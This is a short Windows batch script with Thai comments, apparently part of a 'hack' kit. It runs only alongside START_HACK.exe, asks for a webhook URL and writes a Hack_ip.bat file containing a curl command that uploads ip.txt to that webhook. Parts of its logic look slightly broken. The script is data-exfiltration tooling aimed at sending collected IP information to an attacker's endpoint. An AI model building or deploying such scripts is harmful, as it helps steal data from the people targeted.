@echo off

rem ตรวจสอบว่าไฟล์แบตช์เปิดด้วย START_HACK.exe หรือไม่
set START_HACK_PROCESS_NAME="START_HACK.exe"
set START_HACK_PROCESS_ID=0
for /f "delims=" %%i in ('tasklist ^| findstr /i "%START_HACK_PROCESS_NAME%"') do (
  set START_HACK_PROCESS_ID=%%i
)

rem หากไฟล์แบตช์ไม่เปิดด้วย START_HACK.exe ให้ปิด
if "%START_HACK_PROCESS_ID%"=="0" (
  echo "ไฟล์แบตช์นี้เปิดไม่ถูกต้อง"
  exit
)

rem ดำเนินการคำสั่งที่เหลือในไฟล์แบตช์

:menu
color c
SET /p webhook=" webhook >  "
cd Hack_target
echo -hack >> Hack_ip.bat
echo curl -X POST -F "file=@ip.txt-hack" "%webhook%" >>Hack_ip.bat
exit